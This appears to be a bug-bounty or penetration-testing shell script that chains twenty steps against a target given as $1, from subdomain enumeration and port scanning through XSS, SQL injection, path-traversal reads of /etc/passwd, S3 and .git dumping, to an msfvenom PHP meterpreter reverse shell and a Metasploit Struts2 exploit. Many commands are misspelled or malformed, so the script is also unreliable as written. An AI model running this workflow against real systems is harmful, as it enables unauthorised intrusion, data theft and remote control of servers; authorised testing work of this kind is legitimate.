#Step-01 Tools for Automation Subdomain
subfinder -d $1 -o sub-subdomains.txt
amass enum -passive -d $1 -o amass-subdomains.txt
assetfinder --subs-only $1 >> assetfinder-subdomain.tx

#Step-02 Tools for Automation Port-Scan
namp -p- --open  -sV -sC -T4 -oN nmap-result.txt $1
masscan -p1-65535 --rate 10000 -oL masscan-result.txt $1

#Club the Subdomain txt file data
cat sub-subdomains.txt amass-subdomains.txt assetfinder-subdomain.tx >> subdomains.txt

#Step-03 Tools for Antomation 
eyewitness -f subdomains.txt --web
cat subdomains.txt | aquatone -out screenshots/

#Step-04 Tools for Automation Directory Brute Force
ffut -u  $1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ffuf_results.txt
gobuster dir -u $1 -w /usr/share/wordllists/dirb/common.txt -o gobuster-results.txt


#Step-05 Tools for Automation
python3 linkfinder.py 0i $1/script.js -o results.html
cat js_files.txt | gf apikeys > secrets.txt

#Step-06
python3 paramspider.py -d $1 --level high -o params.txt
arjun -u $1/api -m GET -o params.json


#Step-07 Automation XSS
cat params.txt | dalfox pipe  -o xxs_results.txt
python3 XSStrike/xsstrike..py -u "$1/index.php?search=query"

#Step-08 Automation SQL Injecct
sqlmap -u "$1/index.php?id=1" --dbs --batch --random-agent

#Step-09 Automaiton SSRF
python33 gopherus.py
interactsh-cllient -v

#Step-10 Automation LFI and RFI Detection
python3 lfisuite.py -u "$1/index.php?file=../../../etc/passwd"
fimap -u "$1/index.php?file=test"

#step-11 Automation  ORD
python3 oralyxer.py -l urls.txt -p payloads.txt

#Step-12 Automation Seccurity Headers Checck
nikto -h $1
httpx -u $1 -sc -title -server -o headers.txt

#Step-13 Automation API Recon
kiterunner -u $1 -w wordlist/apis.txt

#Step-14 Automation Contant Discovey
gau $1 | tee urls.txt
waybackusrls $1 > Wayback.txt

#Step-14 Automation S3 Bucket
python3 AWSBucketdump.py -l target-bukets.txt -D

#Step-16 Automaiotn  CMS
python3 cmseek.py -u $1

#Sep-17  Automation WAF Detection
wafw00f $1

#Step-18 Automation Information Disclosure Dection
python3 gitdumper.py $1/.git /output-folder/


#Step-19 Automation reveerse shell generation
msfvenom -p php/meterpreter/reverse_tcp LHOST='ip eth0' LPORT=4444 -f raw > shell.php


#Step-20 Automation mass exploition with metasploit
msfconsole
use exploit/multi/http/struts2_namespace_ognl
